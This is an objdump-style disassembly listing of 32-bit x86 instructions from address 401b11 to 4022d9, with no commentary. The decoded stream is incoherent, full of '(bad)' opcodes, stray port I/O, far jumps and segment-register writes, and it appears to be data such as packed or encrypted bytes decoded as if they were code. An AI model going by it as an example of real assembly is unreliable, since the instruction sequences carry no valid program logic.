  401b11:	rol    BYTE PTR [esi-0x77da122b],0x78
  401b18:	in     al,dx
  401b19:	sbb    ecx,edx
  401b1b:	fbstp  TBYTE PTR [eax]
  401b1d:	call   0xf48211d6
  401b22:	mov    ah,0x10
  401b24:	sbb    esi,eax
  401b26:	push   es
  401b27:	xor    edx,DWORD PTR [edx-0x26d90b1f]
  401b2d:	mov    BYTE PTR [esi],bh
  401b2f:	mov    edi,0xa6c9c8d0
  401b34:	out    dx,al
  401b35:	rcl    DWORD PTR [esi-0x32198da],1
  401b3b:	fcom   QWORD PTR [esi]
  401b3d:	(bad)
  401b40:	jno    0x401b43
  401b42:	adc    eax,0x21ca834d
  401b47:	cmp    ebp,DWORD PTR [esi+0x60]
  401b4a:	out    0xfa,eax
  401b4c:	cmp    ah,ah
  401b4e:	sbb    al,0x5b
  401b50:	in     al,0x25
  401b52:	call   0xf1c7:0xf3382234
  401b59:	das    
  401b5a:	test   al,0xd
  401b5c:	sub    cl,BYTE PTR [ebp-0xa0bdd8e]
  401b62:	push   es
  401b63:	jns    0x401bd5
  401b65:	mov    ch,0x91
  401b67:	out    0xd1,eax
  401b69:	mov    ss,WORD PTR [ecx-0x28add552]
  401b6f:	out    0xb9,al
  401b71:	outs   dx,DWORD PTR ds:[esi]
  401b72:	jle    0x401b6a
  401b74:	(bad)  
  401b77:	cmp    bl,ah
  401b79:	mov    ebp,0x562e748f
  401b7e:	out    dx,eax
  401b7f:	or     ah,bh
  401b81:	mov    ah,0xfd
  401b83:	ret    
  401b84:	popf   
  401b85:	xchg   ecx,eax
  401b86:	dec    esp
  401b87:	mov    BYTE PTR [ecx],cl
  401b89:	je     0x401bde
  401b8b:	xor    DWORD PTR [ebx+ebp*1-0x17772670],ecx
  401b92:	or     edi,eax
  401b94:	add    al,bh
  401b96:	xchg   edx,eax
  401b97:	sbb    al,0xd
  401b99:	test   BYTE PTR [edx-0x60],dh
  401b9c:	inc    ebx
  401b9d:	fild   WORD PTR [eax-0x27]
  401ba0:	mov    ecx,0x156e8090
  401ba5:	xchg   BYTE PTR [ecx],ah
  401ba7:	jns    0x401beb
  401ba9:	mov    ch,0xa8
  401bab:	dec    edi
  401bac:	sbb    al,0x4
  401bae:	addr16 push eax
  401bb0:	(bad)  
  401bb1:	sub    eax,0x5706eb18
  401bb6:	mov    edi,0x5eab79d7
  401bbb:	xchg   BYTE PTR [edx],dh
  401bbd:	aam    0x17
  401bbf:	xor    ecx,ebp
  401bc1:	cdq    
  401bc2:	arpl   sp,cx
  401bc4:	push   ebx
  401bc5:	xchg   ebp,eax
  401bc6:	(bad)  
  401bc7:	sub    BYTE PTR [ebx],0xbc
  401bca:	add    BYTE PTR [eax-0x52f812ac],cl
  401bd0:	add    eax,0x62eb1e3
  401bd5:	retf   
  401bd6:	out    0x8e,eax
  401bd8:	cmp    eax,0x7ac0190e
  401bdd:	mov    bh,0x6b
  401bdf:	pop    eax
  401be0:	shl    bl,1
  401be2:	xchg   ebp,eax
  401be3:	mov    dh,0x7b
  401be5:	pop    ecx
  401be6:	sub    al,0x44
  401be8:	mov    ds:0xa2592e8,eax
  401bed:	std    
  401bee:	push   ss
  401bef:	jmp    0x401ba7
  401bf1:	ds out 0x70,al
  401bf4:	sbb    al,0xa5
  401bf6:	mov    edi,0x784a1f3b
  401bfb:	jle    0x401ba6
  401bfd:	dec    ebx
  401bfe:	xor    bh,bl
  401c00:	loop   0x401c56
  401c02:	jns    0x401bfc
  401c04:	das    
  401c05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c06:	jmp    0x401c70
  401c08:	push   ebx
  401c09:	outs   dx,DWORD PTR ds:[esi]
  401c0a:	mov    DWORD PTR [eax-0x7f],ebx
  401c0d:	rep lods eax,DWORD PTR ds:[esi]
  401c0f:	hlt    
  401c10:	test   bh,cl
  401c12:	pop    ecx
  401c13:	mov    dh,0x9b
  401c15:	enter  0x998d,0x38
  401c19:	cmp    BYTE PTR [ecx],al
  401c1b:	adc    eax,DWORD PTR [ebx+0x57778df7]
  401c21:	(bad)  
  401c22:	das    
  401c23:	lods   eax,DWORD PTR ds:[esi]
  401c24:	xchg   edi,eax
  401c25:	outs   dx,BYTE PTR ds:[esi]
  401c26:	xrelease mov BYTE PTR [ebx+edi*1],dl
  401c2a:	ficom  WORD PTR [esi+0x691c4ac3]
  401c30:	and    bl,BYTE PTR [ecx-0x37f3c012]
  401c36:	sahf   
  401c37:	enter  0x80a,0x11
  401c3b:	sub    BYTE PTR [esi+0x2a],0xf9
  401c3f:	inc    edi
  401c40:	(bad)  
  401c41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c42:	mov    cl,0x1f
  401c44:	outs   dx,DWORD PTR ds:[esi]
  401c45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c46:	dec    ecx
  401c47:	or     eax,0x4323ed2b
  401c4c:	popf   
  401c4d:	cmp    BYTE PTR [edx-0x7b],al
  401c50:	fwait
  401c51:	repz idiv BYTE PTR [edx]
  401c54:	aad    0xa2
  401c56:	sub    BYTE PTR [ebx+0x24],0xa0
  401c5a:	mov    al,BYTE PTR [ebx]
  401c5c:	or     edx,edi
  401c5e:	dec    ecx
  401c5f:	cwde   
  401c60:	fisubr DWORD PTR [edi+0x6b]
  401c63:	xlat   BYTE PTR ds:[ebx]
  401c64:	adc    eax,0x2344ea6e
  401c69:	inc    edx
  401c6a:	push   cs
  401c6b:	mov    ch,0x5c
  401c6d:	call   DWORD PTR [ebp+0xb]
  401c70:	in     eax,0xb1
  401c72:	pop    es
  401c73:	sar    dl,cl
  401c75:	jge    0x401c09
  401c77:	pop    ecx
  401c78:	fcomp  st(0)
  401c7a:	icebp  
  401c7b:	jg     0x401c32
  401c7d:	mov    ds:0x33fd8180,eax
  401c82:	or     dh,dl
  401c84:	mov    ebx,DWORD PTR [ebx]
  401c86:	inc    esp
  401c87:	sub    edi,ebp
  401c89:	push   ds
  401c8a:	(bad)  
  401c8b:	pop    ebx
  401c8c:	pop    ebp
  401c8d:	(bad)  
  401c8e:	cmp    ecx,DWORD PTR [edx]
  401c90:	or     ecx,esi
  401c92:	sub    BYTE PTR [eax-0x70f91582],dh
  401c98:	loop   0x401c30
  401c9a:	cwde   
  401c9b:	lods   eax,DWORD PTR ds:[esi]
  401c9c:	add    eax,0xe6e3ce18
  401ca1:	push   cs
  401ca2:	sahf   
  401ca3:	xor    ebx,DWORD PTR [ecx+0x168da486]
  401ca9:	mov    bh,0x8c
  401cab:	popa   
  401cac:	and    eax,esi
  401cae:	out    0xdd,al
  401cb0:	das    
  401cb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cb2:	das    
  401cb3:	push   cs
  401cb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cb5:	mov    ecx,0xa2a81f86
  401cba:	repz inc eax
  401cbc:	mov    edx,0xc1476d61
  401cc1:	mov    esp,0x2e4aa07b
  401cc6:	fcomp  DWORD PTR [esp+ecx*4]
  401cc9:	mov    ch,BYTE PTR [ebx+0x5f]
  401ccc:	push   ss
  401ccd:	aas    
  401cce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ccf:	cwde   
  401cd0:	sar    BYTE PTR [ecx+ecx*8],cl
  401cd3:	mov    esp,DWORD PTR [ebx+0x7262a237]
  401cd9:	pop    ebp
  401cda:	mov    edx,0x7c3a656f
  401cdf:	xchg   ebx,eax
  401ce0:	sub    dh,cl
  401ce2:	outs   dx,DWORD PTR ds:[esi]
  401ce3:	push   ebp
  401ce4:	sub    al,0x71
  401ce6:	push   es
  401ce7:	push   edi
  401ce8:	les    edx,FWORD PTR [ecx+eiz*2+0x14]
  401cec:	inc    ecx
  401ced:	fucom  st(6)
  401cef:	inc    ebp
  401cf0:	dec    edi
  401cf1:	sbb    edi,DWORD PTR [ebx]
  401cf3:	aaa    
  401cf4:	repnz call 0xad12:0x2ee35754
  401cfc:	mov    ebx,0xb1a9d985
  401d01:	pop    ds
  401d02:	into   
  401d03:	daa    
  401d04:	mov    dh,0x17
  401d06:	fucomp st(2)
  401d08:	lahf   
  401d09:	sub    BYTE PTR [edi+ebx*4-0x44],0x61
  401d0e:	pusha  
  401d0f:	jmp    0xd578:0xb834a6f4
  401d16:	inc    edx
  401d17:	sub    eax,0x52703fbf
  401d1c:	pop    esi
  401d1d:	cmp    al,0x48
  401d1f:	xchg   edi,eax
  401d20:	mov    ch,0x6f
  401d22:	dec    esi
  401d23:	pop    esi
  401d24:	ret    
  401d25:	sub    BYTE PTR [eax],cl
  401d27:	in     ax,dx
  401d29:	pushf  
  401d2a:	scas   eax,DWORD PTR es:[edi]
  401d2b:	cs jmp 0x9af5:0x741496ba
  401d33:	pop    ebp
  401d34:	ret    0xa22f
  401d37:	je     0x401ce0
  401d39:	inc    edx
  401d3a:	mov    al,0x63
  401d3c:	repz adc DWORD PTR [esi+0x511191a9],esp
  401d43:	sbb    al,0xd8
  401d45:	inc    esp
  401d46:	mov    WORD PTR [ecx],gs
  401d48:	cwde   
  401d49:	push   ds
  401d4a:	pop    ebp
  401d4b:	fidiv  WORD PTR [ebp-0x7e051794]
  401d51:	mov    ch,BYTE PTR [eax+ebp*2+0x521f2cb9]
  401d58:	xchg   ebp,eax
  401d59:	sub    BYTE PTR [ebp+0x73],ah
  401d5c:	xchg   esp,eax
  401d5d:	sbb    BYTE PTR [edx-0x33e68279],cl
  401d63:	test   DWORD PTR [ebp-0xcc8bbec],eax
  401d69:	loop   0x401da3
  401d6b:	mov    al,0x2f
  401d6d:	out    0xb0,eax
  401d6f:	aam    0xd0
  401d71:	test   al,0xaa
  401d73:	inc    edx
  401d74:	or     eax,0xb120e27
  401d79:	mov    ebx,0x73cf55db
  401d7e:	ror    BYTE PTR [esi],0x6e
  401d81:	sahf   
  401d82:	push   edx
  401d83:	fdiv   QWORD PTR [eax]
  401d85:	sub    BYTE PTR [ebx-0x5b936996],0x22
  401d8c:	aam    0x1a
  401d8e:	jge    0x401d8a
  401d90:	push   ebp
  401d91:	retf   0x90bc
  401d94:	inc    eax
  401d95:	jne    0x401de7
  401d97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d98:	add    eax,0x89268b5a
  401d9d:	in     eax,0xc0
  401d9f:	call   0xee020af2
  401da4:	aaa    
  401da5:	mov    esp,0xa9ea734b
  401daa:	jno    0x401d89
  401dac:	stos   BYTE PTR es:[edi],al
  401dad:	mov    esp,0x60e491d9
  401db2:	lea    ecx,[esi-0x3a38df32]
  401db8:	pop    es
  401db9:	cld    
  401dba:	ds xchg esi,eax
  401dbc:	dec    ebp
  401dbd:	xchg   esi,eax
  401dbe:	call   0xce70f07f
  401dc3:	(bad)  [edi+0x1c203100]
  401dc9:	in     al,0x84
  401dcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dcc:	dec    ebp
  401dcd:	out    0x21,eax
  401dcf:	mov    eax,ds:0x3023b9aa
  401dd4:	inc    DWORD PTR [ebx-0x4]
  401dd7:	cld    
  401dd8:	and    eax,0xbee52d08
  401ddd:	(bad)  
  401dde:	fcmovnb st,st(3)
  401de0:	or     DWORD PTR [edi+edx*1-0x3dd96993],0xa108beb1
  401deb:	cmp    dx,WORD PTR ds:[ecx+ecx*2-0x7478722f]
  401df4:	sub    BYTE PTR [edx],al
  401df6:	sbb    bh,dh
  401df8:	jecxz  0x401db6
  401dfa:	xor    BYTE PTR [eax+eax*4-0x24],ch
  401dfe:	aas    
  401dff:	xor    eax,0x595e99dd
  401e04:	cmp    al,0xc5
  401e06:	pushf  
  401e07:	aad    0x8a
  401e09:	stos   DWORD PTR es:[edi],eax
  401e0a:	mov    BYTE PTR [ebx],dl
  401e0c:	out    0xa2,eax
  401e0e:	inc    esp
  401e0f:	dec    ebx
  401e10:	leave  
  401e11:	push   eax
  401e12:	or     al,BYTE PTR ds:0x5dc6b426
  401e18:	add    ecx,DWORD PTR [eax-0x5c]
  401e1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e1c:	call   0x8d84:0xb3cacb29
  401e23:	daa    
  401e24:	and    DWORD PTR [eax],0xfffffff6
  401e27:	or     ecx,DWORD PTR [ebx+0x1efdc0c]
  401e2d:	inc    dl
  401e2f:	sbb    eax,0x45a2021f
  401e34:	out    0x30,eax
  401e36:	jne    0x401e0c
  401e38:	jnp    0x401dcd
  401e3a:	or     ebp,DWORD PTR [edi]
  401e3c:	pop    es
  401e3d:	push   ds
  401e3e:	imul   ecx,DWORD PTR [edi+0x7b6beb65],0x995d33c2
  401e48:	repz (bad) 
  401e4a:	(bad)  
  401e4b:	int    0x74
  401e4d:	cmp    eax,0x8da557d1
  401e52:	loopne 0x401e8c
  401e54:	and    ebx,DWORD PTR [edi+0x4d]
  401e57:	test   ecx,edi
  401e59:	fwait
  401e5a:	mov    esi,0xc5f59943
  401e5f:	test   eax,0xa0176f7
  401e64:	jl     0x401df2
  401e66:	sbb    DWORD PTR [eax-0x67],ebp
  401e69:	out    dx,eax
  401e6a:	jno    0x401df5
  401e6c:	pop    esi
  401e6d:	mov    ch,0xfa
  401e6f:	js     0x401ec5
  401e71:	xchg   esp,eax
  401e72:	out    0xd8,al
  401e74:	sub    ebp,DWORD PTR [esi+0x70ef82b6]
  401e7a:	xchg   esi,eax
  401e7b:	inc    edi
  401e7c:	aaa    
  401e7d:	add    esp,ecx
  401e7f:	inc    edi
  401e80:	add    al,0x96
  401e82:	add    ecx,DWORD PTR [esi+ebp*4]
  401e85:	ins    BYTE PTR es:[edi],dx
  401e86:	les    eax,FWORD PTR [esi]
  401e88:	mov    al,ds:0x37189d97
  401e8d:	cmp    eax,0xb5c5141b
  401e92:	jp     0x401e76
  401e94:	inc    edi
  401e95:	push   ebp
  401e96:	dec    esp
  401e97:	test   BYTE PTR [esi+0xa726704],bl
  401e9d:	aaa    
  401e9e:	cmp    al,0xba
  401ea0:	shl    cl,1
  401ea2:	push   edi
  401ea3:	test   eax,esp
  401ea5:	idiv   BYTE PTR cs:[edi-0x24d437f2]
  401eac:	ss xchg edx,eax
  401eae:	cs clc 
  401eb0:	sahf   
  401eb1:	cmp    DWORD PTR [ebx-0x2f8c6ccd],0x7deabcbf
  401ebb:	cli    
  401ebc:	js     0x401f1b
  401ebe:	enter  0x7ce7,0x60
  401ec2:	int    0x63
  401ec4:	retf   
  401ec5:	gs js  0x401ea7
  401ec8:	es sub eax,0x7b6400e
  401ece:	mov    bl,0x37
  401ed0:	or     eax,DWORD PTR [eax-0x3d]
  401ed3:	push   ecx
  401ed4:	test   DWORD PTR [eax-0x74],edi
  401ed7:	sub    al,0x64
  401ed9:	cmp    ch,BYTE PTR [edi-0x2d]
  401edc:	mov    ah,0xd8
  401ede:	sar    bh,1
  401ee0:	cmc    
  401ee1:	mov    esp,0xfdeede9d
  401ee6:	test   DWORD PTR [edx+0xe],ebx
  401ee9:	pushf  
  401eea:	mov    edx,0x5a1aee8a
  401eef:	xchg   edx,eax
  401ef0:	enter  0x2b90,0x99
  401ef4:	out    dx,al
  401ef5:	xchg   DWORD PTR [edi+0x25],esi
  401ef8:	add    BYTE PTR [ecx+0x1d],al
  401efb:	sbb    ch,BYTE PTR [edx+0x1600aeb8]
  401f01:	push   eax
  401f02:	push   ebp
  401f03:	ror    DWORD PTR [esi-0x323068f8],1
  401f09:	adc    BYTE PTR [eax],dl
  401f0b:	arpl   si,di
  401f0d:	adc    al,0x7b
  401f0f:	mov    esi,0x456669b5
  401f14:	jle    0x401f6d
  401f16:	push   cs
  401f17:	inc    esp
  401f18:	aad    0x7b
  401f1a:	pop    edx
  401f1b:	call   0xee78:0xdf7da3e4
  401f22:	test   eax,0x31d0bda4
  401f27:	in     al,0x96
  401f29:	popa   
  401f2a:	call   0xa1e5beb5
  401f2f:	add    esp,DWORD PTR ds:0xb82fb348
  401f35:	jg     0x401eee
  401f37:	or     dh,BYTE PTR [ecx]
  401f39:	xlat   BYTE PTR ds:[ebx]
  401f3a:	rcr    BYTE PTR [edx-0x1b],cl
  401f3d:	repnz push 0x9cb4c376
  401f43:	imul   ebp,DWORD PTR [ebx-0x30de6803],0x44
  401f4a:	mov    ds:0x260de893,al
  401f4f:	push   0x59c5030c
  401f54:	mov    DWORD PTR [ebx+0x9b6cf35],edi
  401f5a:	mov    ?,WORD PTR [edx+0x47]
  401f5d:	enter  0x8ec4,0xb2
  401f61:	pop    eax
  401f62:	mov    WORD PTR [esi],cs
  401f64:	cmp    ah,ch
  401f66:	mov    ah,0xba
  401f68:	mov    dl,0x99
  401f6a:	jecxz  0x401fd9
  401f6c:	push   ds
  401f6d:	pop    esp
  401f6e:	(bad)  
  401f6f:	push   eax
  401f70:	sbb    BYTE PTR [edi+0x75c3cf67],0x3a
  401f77:	popa   
  401f78:	out    0xae,eax
  401f7a:	adc    al,0x39
  401f7c:	or     al,0x95
  401f7e:	jp     0x401fbe
  401f80:	(bad)  
  401f81:	(bad)  
  401f82:	pop    ss
  401f83:	pop    es
  401f84:	pop    esp
  401f85:	sub    BYTE PTR [edx+0x23],dh
  401f88:	(bad)  
  401f89:	not    esi
  401f8b:	inc    edx
  401f8c:	gs bnd jns 0x401fe7
  401f90:	mov    bl,BYTE PTR [ebx+0x16]
  401f93:	sbb    cl,dl
  401f95:	inc    ebx
  401f96:	adc    DWORD PTR [ebx+ebp*1],edx
  401f99:	pop    edx
  401f9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f9b:	pop    edx
  401f9c:	sub    eax,0x2b8dfbcc
  401fa1:	leave  
  401fa2:	push   eax
  401fa3:	sub    bh,bl
  401fa5:	push   ecx
  401fa6:	jp     0x401f2f
  401fa8:	push   ecx
  401fa9:	xchg   ah,bl
  401fab:	(bad)  
  401fac:	lahf   
  401fad:	test   esp,ebp
  401faf:	mov    ch,0xd2
  401fb1:	imul   ecx,esi,0xffffffc6
  401fb4:	cmp    bl,BYTE PTR [edi]
  401fb6:	ss (bad) 
  401fb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fb9:	popa   
  401fba:	or     bl,BYTE PTR [esi]
  401fbc:	loopne 0x401f9b
  401fbe:	mov    ebp,0xb4bafa7b
  401fc3:	xchg   esp,eax
  401fc4:	mov    bh,0x52
  401fc6:	enter  0xb0fa,0x69
  401fca:	or     BYTE PTR [eax-0x13],bl
  401fcd:	push   ds
  401fce:	mov    BYTE PTR [edx],dl
  401fd0:	fild   QWORD PTR [esi+0x56]
  401fd3:	jnp    0x402044
  401fd5:	loop   0x401f9a
  401fd7:	xchg   esi,eax
  401fd8:	in     eax,dx
  401fd9:	cmp    dl,BYTE PTR [edx-0x50]
  401fdc:	int    0xfe
  401fde:	jbe    0x401ff9
  401fe0:	shl    ch,cl
  401fe2:	dec    ebp
  401fe3:	add    DWORD PTR [edi+ebp*4],esi
  401fe6:	jmp    0x4284:0x111d78d
  401fed:	jmp    0x6055cf1f
  401ff2:	jl     0x401f85
  401ff4:	test   al,0xb2
  401ff6:	leave  
  401ff7:	loop   0x401fb7
  401ff9:	pop    esi
  401ffa:	int    0xe
  401ffc:	or     edi,DWORD PTR ds:0xedf92626
  402002:	call   FWORD PTR [edi]
  402004:	mov    BYTE PTR [edi+0x76],ch
  402007:	fcom   st(7)
  402009:	push   es
  40200a:	loope  0x402033
  40200c:	loop   0x401fc0
  40200e:	fdivr  QWORD PTR [edx-0x45]
  402011:	ret    
  402012:	sub    DWORD PTR [ebp-0xbdb3cc5],esp
  402018:	aad    0xb8
  40201a:	std    
  40201b:	inc    esp
  40201c:	and    cl,al
  40201e:	mov    edi,ss
  402020:	rcr    bh,cl
  402022:	fdivr  QWORD PTR [ecx+0x4d98ad3c]
  402028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402029:	inc    ebp
  40202a:	inc    ecx
  40202b:	add    eax,0x58939fa1
  402030:	das    
  402031:	loop   0x402081
  402033:	mov    bl,0xc1
  402035:	arpl   WORD PTR [ebx-0x7f],dx
  402038:	xchg   BYTE PTR [ebp+0x1e],bl
  40203b:	xlat   BYTE PTR ds:[ebx]
  40203c:	ret    
  40203d:	test   eax,0x377247c2
  402042:	xor    DWORD PTR [edi],ecx
  402044:	mov    esp,0xd6b3f291
  402049:	popa   
  40204a:	mov    dh,0x38
  40204c:	test   DWORD PTR [esi+0x3f],ebx
  40204f:	and    eax,0xe471ee17
  402054:	mov    ch,0x14
  402056:	xor    eax,0x7b76e4f3
  40205b:	rcl    DWORD PTR [ecx-0x6a],cl
  40205e:	mov    edx,0x867bc714
  402063:	dec    edx
  402064:	data16 jge 0x402079
  402067:	dec    edi
  402068:	jne    0x40207a
  40206a:	retf   
  40206b:	les    eax,FWORD PTR [edx]
  40206d:	dec    ecx
  40206e:	or     al,0x8c
  402070:	hlt    
  402071:	mov    DWORD PTR [esi-0x4738faaf],edi
  402077:	mov    ?,WORD PTR [ecx]
  402079:	call   0xa786:0x6bcff3aa
  402080:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  402082:	outs   dx,BYTE PTR ds:[esi]
  402083:	push   eax
  402084:	jecxz  0x402006
  402086:	ret    
  402087:	pushf  
  402088:	retf   
  402089:	mov    ds:0x6f98d43d,al
  40208e:	fwait
  40208f:	sub    bh,BYTE PTR [eax+0x57]
  402092:	fild   DWORD PTR [eax+esi*1+0x7bb2af39]
  402099:	push   es
  40209a:	push   esi
  40209b:	pusha  
  40209c:	ds fsincos 
  40209f:	mov    ah,0x52
  4020a1:	scas   al,BYTE PTR es:[edi]
  4020a2:	das    
  4020a3:	and    al,0xa5
  4020a5:	mov    bh,0xe
  4020a7:	xor    BYTE PTR [edx-0x3ec27d56],ah
  4020ad:	cmp    DWORD PTR [esi+0x4e0d9268],0xffffff81
  4020b4:	loop   0x40204b
  4020b6:	retf   0xc68b
  4020b9:	jb     0x4020b3
  4020bb:	add    eax,0xc0cb62cd
  4020c0:	les    ebx,FWORD PTR [eax+0x55719636]
  4020c6:	mov    cl,0x68
  4020c8:	arpl   WORD PTR [edx-0x57],di
  4020cb:	push   edi
  4020cc:	(bad)  
  4020ce:	div    edi
  4020d0:	cmp    eax,0x8b074a71
  4020d5:	jl     0x4020d0
  4020d7:	xor    ch,BYTE PTR [eax-0x7f4b5d5a]
  4020dd:	sub    ebp,DWORD PTR [eax+ebx*1+0x6a]
  4020e1:	dec    edx
  4020e2:	out    0xe1,al
  4020e4:	add    bh,ah
  4020e6:	outs   dx,BYTE PTR ds:[esi]
  4020e7:	mov    dl,BYTE PTR [ebx+0x78171216]
  4020ed:	cwde   
  4020ee:	inc    esi
  4020ef:	das    
  4020f0:	add    eax,0xd81049fd
  4020f5:	rol    esi,cl
  4020f7:	lods   al,BYTE PTR ds:[esi]
  4020f8:	xchg   BYTE PTR [esi],bh
  4020fa:	dec    edx
  4020fb:	push   cs
  4020fc:	stos   BYTE PTR es:[edi],al
  4020fd:	jo     0x4020d5
  4020ff:	jnp    0x4020ec
  402101:	mov    WORD PTR [eax-0x3b45a301],es
  402107:	adc    bl,BYTE PTR [ebp-0x3e]
  40210a:	scas   eax,DWORD PTR es:[edi]
  40210b:	jg     0x402123
  40210d:	inc    edx
  40210e:	dec    ecx
  40210f:	mov    ecx,0x144a1692
  402114:	mov    esp,0x56d9ede
  402119:	popa   
  40211a:	leave  
  40211b:	pop    ebx
  40211c:	add    DWORD PTR es:[edi+0x5e3bea9b],ecx
  402123:	call   0x262fe3ad
  402128:	mov    al,0x9e
  40212a:	push   cs
  40212b:	js     0x40212d
  40212d:	sbb    al,0xfa
  40212f:	push   ebx
  402130:	fidivr WORD PTR [ecx-0x26f62b40]
  402136:	pushf  
  402137:	imul   ecx,DWORD PTR [ecx+0x3b7e0333],0x6d55f262
  402141:	pop    DWORD PTR [esi+0x48]
  402144:	jnp    0x402155
  402146:	mov    ebx,0xe5da28da
  40214b:	mov    ch,0x19
  40214d:	popf   
  40214e:	repz and edx,DWORD PTR [ebx+0xe34fa7f]
  402155:	inc    esi
  402156:	(bad)  
  402157:	aad    0xde
  402159:	mov    cl,0x9d
  40215b:	fld    TBYTE PTR [eax-0x4120ac9b]
  402161:	xchg   ecx,eax
  402162:	ins    DWORD PTR es:[edi],dx
  402163:	in     al,dx
  402164:	push   edi
  402165:	push   esi
  402166:	xor    BYTE PTR [ebx],bl
  402168:	pop    es
  402169:	cli    
  40216a:	and    edx,DWORD PTR [ebp-0x4a783b11]
  402170:	repz test eax,0x217be615
  402176:	ds ja  0x402159
  402179:	stos   BYTE PTR es:[edi],al
  40217a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40217b:	push   edx
  40217c:	xchg   esp,eax
  40217d:	jnp    0x402198
  40217f:	mov    al,es:0x21705cc1
  402185:	jmp    0x4021e1
  402187:	add    al,0xcf
  402189:	xchg   esi,eax
  40218a:	and    eax,DWORD PTR [ebp-0x2]
  40218d:	cli    
  40218e:	push   cs
  40218f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402190:	mov    WORD PTR [eax-0x41],cs
  402193:	xor    edi,esi
  402195:	or     ecx,DWORD PTR [esi]
  402197:	push   edx
  402198:	(bad)  
  402199:	mov    edx,0x595a4913
  40219e:	sbb    esp,0x63
  4021a1:	or     al,0x9a
  4021a3:	repz cmp BYTE PTR [edx+0x45],dh
  4021a7:	jno    0x4021ed
  4021a9:	mov    edi,0xb2ff1f65
  4021ae:	dec    ebp
  4021af:	lahf   
  4021b0:	or     BYTE PTR [eax+eiz*1],ah
  4021b3:	pop    ds
  4021b4:	add    al,0x7f
  4021b6:	ret    
  4021b7:	inc    esp
  4021b8:	push   0xffffffcb
  4021ba:	clc    
  4021bb:	stos   BYTE PTR es:[edi],al
  4021bc:	sub    dh,BYTE PTR [ecx]
  4021be:	adc    DWORD PTR [esi],ebx
  4021c0:	or     DWORD PTR [ecx+eax*2+0x6a],ecx
  4021c4:	xchg   edi,eax
  4021c5:	xchg   esp,eax
  4021c6:	jne    0x4021f6
  4021c8:	mov    ds:0x3c34d011,al
  4021cd:	ror    BYTE PTR [edx],1
  4021cf:	cli    
  4021d0:	pop    ds
  4021d1:	repz mov esp,0xc325dc8b
  4021d7:	mov    edi,0x90b9dda0
  4021dc:	imul   edi,DWORD PTR [ecx+esi*8],0x6
  4021e0:	test   eax,0x29fbbd03
  4021e5:	cmp    esp,DWORD PTR [esi+0x2d0edb8e]
  4021eb:	dec    edi
  4021ec:	cmp    eax,0xd71de79d
  4021f1:	jmp    ecx
  4021f3:	mov    fs:0x28b1cf3f,eax
  4021f9:	inc    DWORD PTR [edx]
  4021fb:	ins    BYTE PTR es:[edi],dx
  4021fc:	adc    eax,DWORD PTR [ecx-0x2a]
  4021ff:	pop    ss
  402200:	cli    
  402201:	pop    esp
  402202:	jbe    0x402254
  402204:	jmp    0xa280:0x316a34a2
  40220b:	dec    ebp
  40220c:	sub    eax,0x48852ab8
  402211:	(bad)  
  402212:	lea    esi,[ebp-0x3566ac87]
  402218:	and    DWORD PTR [ebp+0x28],eax
  40221b:	push   ebx
  40221c:	cld    
  40221d:	jle    0x402250
  40221f:	cdq    
  402220:	test   al,0x2b
  402222:	fstp   QWORD PTR [edi+esi*2-0x5d53e050]
  402229:	pushf  
  40222a:	add    ecx,DWORD PTR [ecx+eiz*1+0x41]
  40222e:	icebp  
  40222f:	sub    al,0x82
  402231:	xchg   ch,bh
  402233:	cmp    DWORD PTR [ecx-0x72],ecx
  402236:	xlat   BYTE PTR ds:[ebx]
  402237:	xchg   esp,eax
  402238:	pop    ebx
  402239:	push   0x71bbfbb7
  40223e:	idiv   DWORD PTR [eax-0x31]
  402241:	pushf  
  402242:	mov    ah,0x9
  402244:	mov    al,ds:0x3d972037
  402249:	sar    BYTE PTR [ebx],cl
  40224b:	mov    bh,0xb3
  40224d:	std    
  40224e:	inc    ecx
  40224f:	push   edx
  402250:	xor    BYTE PTR [ecx+eiz*8-0x37e3a2c8],dh
  402257:	push   0x1a
  402259:	mov    bh,0xc
  40225b:	out    dx,al
  40225c:	sar    dh,1
  40225e:	push   0xffffffda
  402260:	ds ret 0xc780
  402264:	jecxz  0x4021ee
  402266:	mov    cs,edx
  402268:	xchg   esi,eax
  402269:	ss mov esp,0x84aae16b
  40226f:	sbb    eax,DWORD PTR [ebp+0x50bdfd6d]
  402275:	add    BYTE PTR [edx+0x1c],bl
  402278:	repnz sbb al,0x1d
  40227b:	ficom  DWORD PTR [ecx+0x2d]
  40227e:	and    eax,0xd9c732bb
  402283:	popa   
  402284:	xchg   ebp,eax
  402285:	in     al,0x6c
  402287:	in     al,dx
  402288:	xchg   ecx,eax
  402289:	xlat   BYTE PTR ds:[ebx]
  40228a:	ins    DWORD PTR es:[edi],dx
  40228b:	mov    esp,0x95ac01b1
  402290:	jmp    0x9a365aa4
  402295:	dec    edi
  402296:	fdiv   QWORD PTR [eax+edi*1+0x37]
  40229a:	imul   esi,DWORD PTR [edx],0x4345a1d0
  4022a0:	sub    DWORD PTR [ecx+0x6c7ad28d],eax
  4022a6:	rcl    BYTE PTR ds:[edi-0x2b],1
  4022aa:	add    al,dl
  4022ac:	mov    ah,0x2b
  4022ae:	(bad)  
  4022af:	push   cs
  4022b0:	dec    ecx
  4022b1:	and    eax,0x83dc1687
  4022b6:	or     BYTE PTR [ebp+0x7c],dl
  4022b9:	inc    esi
  4022ba:	mov    ecx,0x474fd56e
  4022bf:	adc    cl,BYTE PTR [ebp-0x8798068]
  4022c5:	into   
  4022c6:	push   0x7184396c
  4022cb:	mov    WORD PTR [eax+ecx*2-0xbdb8c57],?
  4022d2:	ror    BYTE PTR [ecx-0x39e2f451],0x87
  4022d9:	out    dx,eax
